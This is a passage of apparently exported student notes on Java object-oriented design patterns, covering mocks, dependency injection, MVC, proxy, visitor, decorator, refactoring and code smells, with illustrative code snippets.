}</code></pre><ul id="1291a926-7344-8079-99a3-c198ed89afc6" class="bulleted-list"><li style="list-style-type:disc">lambdas can be adaptors</li></ul><ul id="1291a926-7344-80be-8102-c383f9c8bacc" class="bulleted-list"><li style="list-style-type:disc">remember, <code>Type::method</code> syntax is just a lambda <br/><br/><code>((Type) x) -&gt; {x.method();}</code></li></ul></div></figure></details></li></ul><ul id="1291a926-7344-80fe-a8b1-fed7e81bf619" class="toggle"><li><details><summary>Mocks</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80e2-91d0-c91d48429b55"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e5392f75-8596-45ab-8081-3a65b7f483a9" class="">mock object <mark class="highlight-yellow_background">provides minimum implementation of an interface</mark> to function in a specific case</p><ul id="1291a926-7344-8000-8594-e178752bc052" class="bulleted-list"><li style="list-style-type:disc">type of adaptor</li></ul><ul id="1291a926-7344-8054-8ef7-ebca2298312c" class="bulleted-list"><li style="list-style-type:disc">often used for testing: check logs satisfy expected result</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8004-9b47-f433a02bc771" class="code"><code class="language-Java">interface FileResource{
		void open();
		void close();
		String readAll();
}

class Read{ 
		static String of(FileResource fr){
				fr.open();
				try{ return fr.readAll(); }
				finally{ fr.close(); }
		}
}

record StringMockFR 
	 (String readAll, List&lt;String&gt; log) implements FileResource{
	 public void open(){ log.add(&quot;open&quot;); } 
	 public void close(){ log.add(&quot;close&quot;); }
}

//testing
List&lt;String&gt; log = new ArrayList&lt;&gt;();
//create mock objects
FileResource mock= new MockFR(&quot;a&quot;,log);
//check the behavior on the boundary (usual)
assertEquals(&quot;a&quot;, Read.of(mock)); 
//check internal behavior! (NEW!)
assertEquals(&quot;[open, close]&quot;, log.toString());</code></pre></div></figure></details></li></ul><ul id="1291a926-7344-8013-8522-d474af3caea3" class="toggle"><li><details><summary>Dependency Injection</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-8057-af0d-ef2127e734af"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6a543113-6262-4920-ad45-ee918dedf934" class="">dependencies are injected into a class externally rather than managing itself</p><ul id="1291a926-7344-8012-a002-e8d1d35c3363" class="bulleted-list"><li style="list-style-type:disc">abstract factory pattern allows objects to be injected rather than the class using the new keyword to manage them itself  </li></ul><ul id="1291a926-7344-80cf-8c60-ee0cea1ad569" class="bulleted-list"><li style="list-style-type:disc">mocks can be injected rather than concrete types to independently test code in group work</li></ul><ul id="1291a926-7344-80f6-8ee8-f2dc2756708e" class="bulleted-list"><li style="list-style-type:disc">abstract factory + mocks = kinda DI</li></ul><ul id="1291a926-7344-8026-b528-c2796e1e898c" class="bulleted-list"><li style="list-style-type:disc">enables loose coupling with other classes/code</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8043-a121-ee239ae628ed" class="code"><code class="language-Java">//tight coupling
interface Charly{
		default WMap read(String fileName){
				WMap res = new BobMap();
				... 
				return res;
		}
		
		default Entity stringToEntity(String e){
			 switch (e){
					 case &quot;Tree&quot;: return new BobTree();
					 case &quot;Rock&quot;: return new BobRock();
					 default: throw new Error(&quot;invalid &quot;+e);
			}
		}
}

//loose coupling with Dependency Injection
interface Charly{
		Supplier&lt;WMap&gt; map();//Could be BobMap map() but also a mock
		Map&lt;String,Supplier&lt;Entity&gt;&gt; es();
				
		default WMap read(String fileName){
				WMap res = map().get();//abstract factory pattern!
				...//code without &#x27;new&#x27; stays the same
				for (var e:data){
						res.set(xi, yi, es().get(e).get()); //abstract factory pattern!
						yi += 1;
						if (yi == WMap.maxY)
							 yi = 0; xi += 1;
				}
				return res;
		}
}</code></pre></div></figure></details></li></ul><ul id="1231a926-7344-8020-807f-c980c2bf41c3" class="toggle"><li><details><summary><mark class="highlight-default">MVC Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-800f-9a16-f81138f77980"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="a39b05aa-a18f-4f7b-8a93-c91df7b7617d" class="">program is made out of a model, view and controller</p><ul id="1291a926-7344-80c1-b1c4-ecbb11857bb7" class="bulleted-list"><li style="list-style-type:disc">model represents the “simulated reality” and logic<ul id="1291a926-7344-80e6-97a1-e4d843c59a55" class="bulleted-list"><li style="list-style-type:circle">observers the view to notify view on changes</li></ul></li></ul><ul id="1291a926-7344-80f6-aed1-cc50d41e99ce" class="bulleted-list"><li style="list-style-type:disc">view displays a slice of the “simulated reality”/model<ul id="1291a926-7344-8076-84b8-f83d71e89e05" class="bulleted-list"><li style="list-style-type:circle">can directly notify the model as a field</li></ul><ul id="1291a926-7344-8018-ac60-ec2e1fccb76e" class="bulleted-list"><li style="list-style-type:circle">observers controller</li></ul></li></ul><ul id="1291a926-7344-80f2-bab0-f63e9e71dec0" class="bulleted-list"><li style="list-style-type:disc">controller converts user events to model actions<ul id="1291a926-7344-806f-8507-d6113ad910e7" class="bulleted-list"><li style="list-style-type:circle">directly notifies the model as a field</li></ul></li></ul><figure id="1291a926-7344-804f-abcb-ea926d080658" class="image"><a href="9e52c9e7-f6f2-4f2f-affd-f2c6dd1980a1.png"><img style="width:679.0243902439025px" src="9e52c9e7-f6f2-4f2f-affd-f2c6dd1980a1.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1291a926-7344-8091-9c95-c77a5c05061d" class="code"><code class="language-Java">record View(LLM llm, Consumer&lt;View&gt; evenListener, List&lt;String&gt; llmResults){
	 void updateFromModel(ReadModel m){..} //view stores model as a parameter
}
interface ReadModel{..} //read only model for data
interface Model extends ReadModel{ //logic to mutate data
 void setEventListener(Runnable e);//model observers the view with a runnable
 void endPhase();
}
record Controller(Model m){ //controller sees model 
 void parseAllActions(String input){..}
}

//client code
Model model= makeModel();
Controller c= new Controller(model); //controller stores the model
View view= new View(
	 new LLM(), 
	 v-&gt;c.parseAllActions(v.llmResults().getLast()), //view observers the controller
	 new ArrayList&lt;&gt;()
);
model.setEventListener(()-&gt;view.updateFromModel(model)); //model observers the view
model.endPhase();
</code></pre><ul id="1291a926-7344-801b-a254-c3bff060070a" class="bulleted-list"><li style="list-style-type:disc">MVC + proxy (model/backend server/db is proxied) is used for web apps</li></ul><ul id="1291a926-7344-80c7-909f-f57b0d78d37b" class="bulleted-list"><li style="list-style-type:disc">MVC without GUI can be used when components interact asynchronously </li></ul></div></figure></details></li></ul><ul id="1231a926-7344-808b-b1dc-c5fca143c9d1" class="toggle"><li><details><summary><mark class="highlight-default">Proxy Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1291a926-7344-80b6-87e7-e937a1321a8d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e64147aa-8f23-40c4-a11e-768ca44c6206" class="">proxy object <mark class="highlight-yellow_background">forwards method calls to a target </mark>or provides a <mark class="highlight-yellow_background">method to get the target</mark></p><ul id="1291a926-7344-805a-b867-eb90560fb1c6" class="bulleted-list"><li style="list-style-type:disc">optional is a proxy where the target may or may not exist</li></ul><figure id="1291a926-7344-804f-9e62-de36294d4895" class="image"><a href="Untitled%207.png"><img style="width:494px" src="Untitled%207.png"/></a></figure></div></figure></details></li></ul><ul id="1231a926-7344-80e5-9b1c-f008f10c06b3" class="toggle"><li><details><summary><mark class="highlight-default">Null Object Pattern</mark></summary></details></li></ul><ul id="1231a926-7344-80ff-9117-e9599c1c828c" class="toggle"><li><details><summary><mark class="highlight-default">Visitor Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-804f-9557-fd94bed11696"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="a247d8d3-bacb-4296-be1a-b6513098bdab" class="">operations represented as objects</p><ul id="1251a926-7344-803b-ba6a-e4972185bdc1" class="bulleted-list"><li style="list-style-type:disc">composite pattern has accept method</li></ul><ul id="1251a926-7344-8052-9144-dfd5bfad535d" class="bulleted-list"><li style="list-style-type:disc">visitor has visit methods for each concrete type</li></ul><ul id="1251a926-7344-80cf-be91-c77d9372b3f6" class="bulleted-list"><li style="list-style-type:disc">concrete types implement accept method to call the corresponding visit method on the visitor argument</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8021-bca7-c4dfcbacfb2c" class="code"><code class="language-Java">interface Visitor&lt;T&gt;{ //operation object type: returns a T
		T visitP(P e);
		T visitDiv(Div e);
}
//composite pattern
interface Node(){T accept(Visitor&lt;T&gt; v);} //component
record P(String text) implements Node{ //leaf
		&lt;T&gt; T accept(Visitor&lt;T&gt; v)){return v.visitP(this);}
}
record Div(List&lt;Node) ns) implements Node{ //composite
	public &lt;T&gt; T accept(Visitor&lt;T&gt; v){ return v.visitDiv(this);}}
}

//ToHTML operation object
class ToHTML implements Visitor&lt;String&gt;{
		String visitP(P e){return &quot;&lt;P&gt;&quot;+e.text()+&quot;&lt;/P&gt;&quot;;}
		String visitDiv(Div e){return e.ns().stream()
				.map(Node::accept(this))
				.collect(Collectors.joining(&quot;\n&quot;,&quot;&lt;DIV&gt;\n&quot;,&quot;\n&lt;/DIV&gt;&quot;));
		}
}

var composite = new Div(List.of(new P(&quot;hello&quot;), new P(&quot;world&quot;)));
String res = composite.accept(new ToHTML());
//&lt;DIV&gt;
//&lt;P&gt;hello&lt;/P&gt;
//&lt;P&gt;world&lt;/P&gt;
//&lt;/DIV&gt;</code></pre></div></figure><h3 id="1251a926-7344-8070-afd5-c9be56c322a0" class="">CloneVisitor</h3><p id="1251a926-7344-8014-8636-c0e4994e741c" class="">a type of visitor that returns a copy of the concrete type</p><ul id="1251a926-7344-80a0-bb05-e2d197070923" class="bulleted-list"><li style="list-style-type:disc">allows for code reuse for creating visitor operations on top of the clone visitor to do overriding later</li></ul><ul id="1251a926-7344-8091-be2a-c46934d47603" class="bulleted-list"><li style="list-style-type:disc">another way to look at it, is that the clonevisitor is adding an operation to clone said object</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8059-be5a-dbfe372863c4" class="code"><code class="language-Java">class CloneVisitor implements Visitor&lt;Node&gt;{
		public Node visitP(P e){ return e; }
		
		//we&#x27;re extending Visitor&lt;Node&gt; but visitDiv operation
		//can refine the return type to a Div (which extends Node)
		public Div visitDiv(Div e){
				var ns= e.ns().stream()
				.map(ei-&gt;ei.accept(this))
				.toList();
				return new Div(ns);
		}
		
		public A visitA(A e){ return e; }
		
		public Node visitUl(Ul e){
				var lis= e.lis().stream()
				.map(ei-&gt;visitLi(ei))
				.toList();
				return new Ul(lis);
				}
				public Li visitLi(Li e){
				return new Li(e.node().accept(this));
		}
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8044-8333-db0bd8d0dc71" class="code"><code class="language-Java">class ToItalian extends CloneVisitor{ //Solution for Visitors 3
		@Override public Node visitP(P e){ return new P(e.text()+&quot; with PIZZA!!&quot;); }
}

class ReverseDivs extends CloneVisitor{
		@Override public Div visitDiv(Div e){
		 var ns= e.ns().stream()
		 .map(ei-&gt;ei.accept(this))
		 .collect(Collectors.toCollection(ArrayList::new));
		 Collections.reverse(ns);
		 return new Div(Collections.unmodifiableList(ns));
		 }
}

class UlToDiv extends CloneVisitor{
	 @Override public Node visitUl(Ul e){
			 var ns= e.lis().stream()
			 .map(li-&gt;visitLi(li))
			 .map(li-&gt;li.node());
			 .toList();
			 return new Div(ns);
	 }
}

class CloneVisitorInLi extends CloneVisitor{
 //Visitors can have state relative to the visit operation itself
 protected boolean inLi= false;
 public Li visitLi(Li li){
 boolean oldInLi= inLi;
 inLi = true;
 try{ return super.visitLi(li); }
 finally{ inLi = oldInLi; }
 }
}

@Override class TastyLi extends CloneVisitorInLi{
 public Node visitP(P e){
		 if (inLi){ return new P(e.text() + &quot; with PIZZA!!&quot;); }
		 return super.visitP(e);
 }
}

class CollectAllText extends CloneVisitor{
 //usage new CollectAllText().collect(myNode)
 @Override public String collect(Node n){ //Slow, it also clone it all.
		 var wasted= n.accept(this); //We could define a PropagatorVisitor
		 return allText; //that does not clone the data
		 }
		 String allText= &quot;&quot;;
		 public Node visitP(P e){
		 allText += e.text();
		 return super.visitP(e);
 }
}</code></pre><h3 id="1251a926-7344-807d-8272-ca4f20baa5ce" class="">PropagatorVisitor</h3><p id="1251a926-7344-80d7-b630-dd2aeeff97e6" class="">a type of visitor that returns a boolean to to interrupt the visit early</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-808d-bccc-e95b781fe618" class="code"><code class="language-Java">class PropagatorVisitor implements Visitor&lt;Boolean&gt;{
 //return false == continue the visit
 public Boolean visitP(P e){ return false; }
 public Boolean visitDiv(Div e){ return any(e.ns(),ei-&gt;ei.accept(this)); }
 public Boolean visitA(A e){ return false; }
 public Boolean visitUl(Ul e){ return any(e.lis(),ei-&gt;visitLi(ei)); }
 public Boolean visitLi(Li e){ return e.node().accept(this); }
 
 public static &lt;T extends Node&gt; Boolean any(List&lt;T&gt; ts, Predicate&lt;T&gt; test){
		 return ts.stream().anyMatch(test);//short-circuit on true
 }
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8070-b4a9-d6dc267c8093" class="code"><code class="language-Java">class CollectAllText2 extends PropagatorVisitor{
	 //better version of CollectAllText
	 public String collect(Node n){
			 //usage new CollectAllText2().collect(myNode)
			 n.accept(this);
			 return allText;
	 }
	 private String allText= &quot;&quot;;
			 public Node visitP(P e){
			 allText += e.text();
			 return super.visitP(e);
	 }
}
class ContainsItalian extends PropagatorVisitor{
	 //usage new ContainsItalian().check(myNode)
	 public boolean check(Node n){ return n.accept(this); }
	 public Node visitP(P e){ return e.text().contains(&quot;Pizza&quot;); }
}

//Using PropagatorVisitor
//In some cases, extending PropagatorVisitor is
//is more efficient than just extending CloneVisitor</code></pre><p id="1251a926-7344-8072-bd35-fdb542e4dfb0" class="">
</p></details></li></ul><ul id="1231a926-7344-80f1-a9e8-d1195f982bcd" class="toggle"><li><details><summary><mark class="highlight-default">Decorator Pattern</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-800a-9816-df8b91b25b58"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="32343409-1add-438d-95af-ddce79ea3a78" class="">object wrapper that enhances/modifiers behavior of the inner object</p><ul id="1251a926-7344-8081-aae0-e18b2492422e" class="bulleted-list"><li style="list-style-type:disc">inner object and decorator objects both implement the component type</li></ul><ul id="1291a926-7344-8003-a09d-e4d8600d7c4c" class="bulleted-list"><li style="list-style-type:disc">like a composite, but only stores 1 inner object</li></ul><figure id="1251a926-7344-8084-8383-db06d814e8f7" class="image"><a href="Untitled%2010.png"><img style="width:480px" src="Untitled%2010.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8066-970b-fe7d1791da25" class="code"><code class="language-Java">interface Entity{ //component
		int power(); 
}

record Character(int power) implements Entity{} //concrete

record Buffs(Character c) implements Entity{ //decorator
		int power(){return c.power() + 10;} //enhancement
}

Entity e = new Character(10);
e.power(); //10
e = new Buffs(e);
e.power(); //20</code></pre></div></figure></details></li></ul><ul id="1251a926-7344-807d-a023-d05e2a487b7c" class="toggle"><li><details><summary><mark class="highlight-default">Refactoring</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-8093-a99c-cff294bb91d2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="15f06ac1-0bba-4779-bf48-ec1498a71ab3" class="">changing code after getting it to work</p><ul id="1251a926-7344-80f0-a724-ea9e4741190f" class="bulleted-list"><li style="list-style-type:disc">clean up</li></ul><ul id="1251a926-7344-801d-8d5d-fa21d8828904" class="bulleted-list"><li style="list-style-type:disc">give meaningful names to classes, methods</li></ul><ul id="1251a926-7344-802d-9880-f61c0ab81b5a" class="bulleted-list"><li style="list-style-type:disc">apply better practices</li></ul></div></figure><h3 id="1251a926-7344-806f-8c18-f010ee8446b2" class="">Auto Refactoring</h3><p id="1251a926-7344-8046-be3e-d4ead6cfacdb" class="">use IDE refactoring options</p><ul id="1251a926-7344-80a8-bf79-f4269aea0072" class="bulleted-list"><li style="list-style-type:disc">write multiple classes in the same file, then refactor by moving them into separate files</li></ul><ul id="1251a926-7344-80bb-8a0e-e8ec6b6e6398" class="bulleted-list"><li style="list-style-type:disc">change names to be more meaningful/thought out</li></ul><h3 id="1251a926-7344-8066-a55d-c02bf65484eb" class="">Manual Refactoring</h3><p id="1251a926-7344-801a-8f7d-df4f758658e9" class="">after getting your code to work, REREAD YOUR CODE</p><ul id="1251a926-7344-80db-b202-ebb71b7d7e87" class="bulleted-list"><li style="list-style-type:disc">improve solution: to be more optimal</li></ul><ul id="1251a926-7344-80a5-9d0c-f0044d0201cf" class="bulleted-list"><li style="list-style-type:disc">clean up: dead code, unused local variables and duplicates</li></ul><ul id="1251a926-7344-80dc-a15c-ff18c75b1c4b" class="bulleted-list"><li style="list-style-type:disc">consistent: make names make sense in context of others</li></ul><ul id="1251a926-7344-80fb-b82d-cb5dc47044d4" class="bulleted-list"><li style="list-style-type:disc">structure refactor: split class with too many responsibilities into multiple smaller classes, merge class with too little responsibilities into other ones</li></ul><ul id="1251a926-7344-8048-b2b3-eb3e0e60e739" class="bulleted-list"><li style="list-style-type:disc">methods with multiple parameters: select the right type/most likely receiver to rely on dynamic dispatch</li></ul></details></li></ul><ul id="1251a926-7344-80c7-b1ef-dfa24929cb8f" class="toggle"><li><details><summary><mark class="highlight-default">Code Smells</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-8062-9a72-e743739bc503"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6146a0c5-e659-4efa-bb4b-a9567d2e9d80" class="">signs that the code is bad</p></div></figure><h3 id="1251a926-7344-80b1-b35e-d3a7f1de84f4" class="">Inexperienced Programmer</h3><ul id="1251a926-7344-8049-998a-e3d592e69bf3" class="bulleted-list"><li style="list-style-type:disc">obvious comments: “main function starts here”</li></ul><ul id="1251a926-7344-803c-8cd8-dbbbb82e5618" class="bulleted-list"><li style="list-style-type:disc">leftover autogenerated todos</li></ul><ul id="1251a926-7344-80b3-a6d8-e5c206698c0c" class="bulleted-list"><li style="list-style-type:disc">prints instead of error management</li></ul><ul id="1251a926-7344-8037-ad71-d71951c8d4de" class="bulleted-list"><li style="list-style-type:disc">unhandled compiler warnings: resolve the issue or add @SuppressWarnining</li></ul><ul id="1251a926-7344-8080-9af4-c8a114a3e1f8" class="bulleted-list"><li style="list-style-type:disc">no evidence of searching for best modern solution: reinventing the wheel over and over again</li></ul><h3 id="1251a926-7344-8051-bd44-c0ed029f476f" class="">No OOP</h3><ul id="1251a926-7344-80b8-9675-eecf7825a31d" class="bulleted-list"><li style="list-style-type:disc">very long files: 500&gt; lines of code</li></ul><ul id="1251a926-7344-8074-8b36-ccdd266d7d9b" class="bulleted-list"><li style="list-style-type:disc">no generics </li></ul><ul id="1251a926-7344-8082-bc4a-d6cb9856658f" class="bulleted-list"><li style="list-style-type:disc">no new features: lambdas, records, streams</li></ul><ul id="1251a926-7344-8005-b516-e6f2e82207aa" class="bulleted-list"><li style="list-style-type:disc">ifs, whiles, fors to handle classable information</li></ul><ul id="1251a926-7344-8086-bd39-d0212f414ef4" class="bulleted-list"><li style="list-style-type:disc">commends to describe what the code is doing: can be method or variable names instead</li></ul><ul id="1251a926-7344-80d8-bb76-e3b2250941e1" class="bulleted-list"><li style="list-style-type:disc">code with too many local variables: can be a class</li></ul></details></li></ul><ul id="1231a926-7344-80c3-b3e3-e475ebbabf50" class="toggle"><li><details><summary><mark class="highlight-default">Anti-Patterns</mark></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1251a926-7344-80a2-9621-ff1e00c62120"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="557e5ee1-99c7-4f1e-bb65-fa03bc161726" class="">patterns that negatively impact system design </p></div></figure><h3 id="1251a926-7344-803e-89db-f142b5461ecc" class="">Big Methods</h3><p id="1251a926-7344-8020-810e-dd0908871c5f" class="">large methods can be converted into multiple smaller methods and classes</p><ul id="1251a926-7344-8050-b6f4-c7648e7e948e" class="toggle"><li><details><summary>example</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1251a926-7344-8018-8389-c8dd16189104" class="code"><code class="language-Java">//code le bad
enum Kind{ Carbs, Meat, Vegetables, Fruit };
record Ingradient(String name, Kind kind, int grams){}
class ItalianLunch{
 List&lt;List&lt;Ingradient&gt;&gt; prepareLunch(List&lt;Ingradient&gt; is, int guests){
 List&lt;Ingradient&gt; first = new ArrayList&lt;&gt;();
 int firstTot = 0;
 List&lt;Ingradient&gt; second = new ArrayList&lt;&gt;();
 int secondTot = 0;
 List&lt;Ingradient&gt; dessert= new ArrayList&lt;&gt;();
 int dessertTot = 0;
 //base
 List&lt;Ingradient&gt; left1= new ArrayList&lt;&gt;();
 for (var i:is){
 if (i.kind() == Kind.Carbs &amp;&amp; firstTot &lt; 300 * guests){
 first.add(i); firstTot += i.grams(); continue;
 }
 if(i.kind() == Kind.Meat &amp;&amp; secondTot &lt; 200 * guests){
 second.add(i); secondTot += i.grams(); continue;
 }
 if(i.kind() == Kind.Fruit &amp;&amp; dessertTot &lt; 500 * guests){
 dessert.add(i); dessertTot += i.grams(); continue;
 }
 left1.add(i);
 }
 
 //sauces for pasta, meat if possible
 List&lt;Ingradient&gt; left2= new ArrayList&lt;&gt;();
 for (var i:left1){
 if (i.kind() == Kind.Meat &amp;&amp; firstTot &lt; 500 * guests){
 first.add(i); firstTot += i.grams();
 }
 else { left2.add(i); }
 }

 //vegetables if needed
 List&lt;Ingradient&gt; left3= new ArrayList&lt;&gt;();
 if (firstTot &lt; 500 * guests){
 for (var i:left2){
 if (i.kind() == Kind.Vegetables &amp;&amp; firstTot &lt; 600 * guests){
 first.add(i); firstTot += i.grams();
 }
 else { left3.add(i); }
 }
 }
 for(var i:left3){//now the side for the meat
 if(i.kind() == Kind.Vegetables &amp;&amp; secondTot &lt; 500 * guests){
 second.add(i); secondTot += i.grams();
 }
 }
 return List.of(first,second,dessert);
 }
 
 
 //turn a method into a class: complex return type to an instace of a class
 interface HandleIngradient{ boolean used(Ingradient i); }
class BetterItalianLunch{
 class Plate{
 List&lt;Ingradient&gt; is= new ArrayList&lt;&gt;();
 int grams= 0;
 boolean mayAdd(Ingradient i, Kind k, int gramsLimit){
 if (grams &gt; gramsLimit * guests || i.kind() != k ) { return false; }
 is.add(i);
 grams += i.grams();
 return true;
 }
 }
 public final Plate first = new Plate();
 public final Plate second = new Plate();
 public final Plate dessert= new Plate();
 private List&lt;Ingradient&gt; left= new ArrayList&lt;&gt;();
 private int guests;
 private void handleRemaining(HandleIngradient h){ left.removeIf(h::used); }
 ...
}

//The method is now a constructor!
 BetterItalianLunch(List&lt;Ingradient&gt; is, int guests){
 left.addAll(is);
 this.guests= guests;
 base();
 sauce();
 side();
 }
 void base(){
 handleRemaining(i-&gt;
 first .mayAdd(i,Kind.Carbs,300)
 || second .mayAdd(i,Kind.Meat, 200)
 || dessert.mayAdd(i,Kind.Fruit,500) );
 }
 void sauce(){
